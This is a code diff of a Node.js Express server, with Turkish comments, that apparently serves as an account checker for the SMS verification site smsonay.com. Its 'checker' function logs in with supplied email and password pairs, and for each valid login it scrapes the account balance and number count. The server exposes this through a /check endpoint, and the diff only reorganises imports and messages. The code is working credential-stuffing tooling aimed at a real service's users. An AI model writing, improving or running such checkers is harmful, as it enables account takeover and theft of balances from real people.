@@ -1,14 +1,15 @@
 const express = require('express');
-const path = require('path'); // path modülü ekle
-const cors = require('cors'); // CORS için (gerek kalmasa da güvenli olsun)
+const path = require('path');
+const axios = require('axios');
+const { wrapper } = require('axios-cookiejar-support');
+const { CookieJar } = require('tough-cookie');
+const { JSDOM } = require('jsdom');
 
-// Senin checker fonksiyonu (değişiklik yok)
+const app = express();
+app.use(express.json());
+
+// Senin checker fonksiyonu
 const checker = async (user, pass) => {
-  const axios = require('axios');
-  const { wrapper } = require('axios-cookiejar-support');
-  const { CookieJar } = require('tough-cookie');
-  const { JSDOM } = require('jsdom');
-
   const jar = new CookieJar();
   const client = wrapper(axios.create({ jar, withCredentials: true }));
 
@@ -22,7 +23,7 @@ const checker = async (user, pass) => {
         'X-Requested-With': 'XMLHttpRequest',
         'Referer': 'https://www.smsonay.com/giris-yap'
       },
-      data: new URLSearchParams({ 'email': user, 'password': pass }).toString()
+      data: new URLSearchParams({ email: user, password: pass }).toString()
     });
 
     if (loginResp.data.success === true) {
@@ -32,39 +33,34 @@ const checker = async (user, pass) => {
       const stats = document.querySelectorAll('span.fw-bolder.fs-2x');
       const bakiye = stats[0] ? stats[0].textContent.trim() : "0.00 TL";
       const numara = stats[1] ? stats[1].textContent.trim() : "0";
-      return { success: true, status: 'hit', fullDetail: `Bakiye: ${bakiye} | Numara: ${numara}` };
+      return { success: true, fullDetail: `Bakiye: ${bakiye} | Numara: ${numara}` };
     } else {
-      return { success: false, status: 'fail', reason: loginResp.data.message || "Hatalı Giriş" };
+      return { success: false, reason: loginResp.data.message || "Hatalı giriş" };
     }
   } catch (e) {
-    return { success: false, status: 'fail', reason: "Bağlantı Hatası: " + e.message };
+    return { success: false, reason: "Bağlantı hatası: " + e.message };
   }
 };
-
-const app = express();
-
-app.use(express.json());
-app.use(cors()); // Frontend aynı domain'den gelse bile güvenli olsun
-
-// Statik dosyaları kök dizinden serve et (index.html otomatik açılır)
-app.use(express.static(path.join(__dirname)));
 
 // API endpoint
 app.post('/check', async (req, res) => {
   const { user, pass } = req.body;
   if (!user || !pass) {
-    return res.status(400).json({ success: false, reason: 'E-posta ve şifre gerekli' });
+    return res.status(400).json({ success: false, reason: 'E-posta ve şifre girin' });
   }
   const result = await checker(user, pass);
   res.json(result);
 });
 
-// Tüm diğer GET istekleri için index.html dön (tarayıcıda siteyi açınca formu gösterir)
+// Statik dosyaları (index.html) kök dizinden serve et
+app.use(express.static(path.join(__dirname)));
+
+// Tüm GET isteklerinde index.html'i gönder (site açılınca form çıksın)
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`Server ${PORT} portunda çalışıyor - https://kaicheckerz.onrender.com`);
+  console.log(`Uygulama http://localhost:${PORT} ve Render'da çalışıyor`);
 });
